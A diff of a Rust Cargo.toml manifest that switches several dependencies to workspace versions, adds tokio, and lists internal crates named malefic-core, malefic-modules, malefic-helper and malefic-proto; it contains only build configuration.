@@ -4,14 +4,15 @@ version = "0.1.1"
 edition = "2021"
 
 [dependencies]
-anyhow = "1.0.89"
-futures = "0.3.31"
-lazy_static = "1.5.0"
+anyhow = { workspace = true }
+futures = { workspace = true }
+lazy_static = { workspace = true }
 
-malefic-core = { path = "../malefic-core"}
+malefic-core = { path = "../malefic-core", features = [ ] }
 malefic-modules = { path = "../malefic-modules"}
 malefic-helper = { path= "../malefic-helper", features = [ "default" ] }
 malefic-proto = { path= "../malefic-proto", features = [ "Crypto_AES" ] }
+tokio = { workspace = true, features = ["rt", "rt-multi-thread"] }
 
-[target.'cfg(target_os = "windows")'.build-dependencies]
-embed-resource = "3.0.2"
+[build-dependencies]
+embed-resource = { workspace = true }
